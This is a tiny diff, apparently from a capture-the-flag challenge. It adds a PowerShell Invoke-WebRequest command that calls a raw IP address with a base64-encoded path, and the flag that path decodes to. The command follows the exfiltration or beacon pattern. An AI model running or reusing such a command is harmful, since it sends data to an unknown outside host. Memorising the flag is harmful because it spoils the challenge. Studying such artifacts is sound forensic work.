@@ -1,0 +1,3 @@
+powershell -Command Invoke-WebRequest -Uri http://74.248.114.242/RERDezVZNU0wTjE1NFczNTBNM1dVSFV9
+
+DDC{5Y5M0N154W350M3WUHU}
